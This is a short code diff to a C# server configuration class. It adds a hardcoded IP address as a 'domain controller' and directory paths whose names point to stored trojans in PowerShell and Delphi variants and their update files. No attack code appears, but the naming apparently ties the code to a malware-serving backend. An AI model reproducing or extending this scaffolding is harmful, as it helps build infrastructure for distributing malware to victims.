@@ -16,7 +16,21 @@ public static class ServerModelLoader
         }
     }
     
+    public static string DomainControllerStatic = "185.247.141.76";
+    
     public static string CpDirStatic => Path.Combine(RootDirStatic, "cp");
     
     public static string CertDirStatic => Path.Combine(RootDirStatic, "cert");
+    
+    public static string SysDirStatic => Path.Combine(RootDirStatic, "sys");
+    
+    public static string CmplDirStatic => Path.Combine(RootDirStatic, "cmpl");
+    
+    public static string AdsDirStatic => Path.Combine(RootDirStatic, "ads");
+    
+    public static string UpdDirStatic => Path.Combine(RootDirStatic, "troyan/upd");
+    
+    public static string TroyanScriptDirStatic => Path.Combine(RootDirStatic, "troyan/troyanps");
+
+    public static string TroyanDelphiDirStatic => Path.Combine(RootDirStatic, "troyan/troyandelphi");
 }
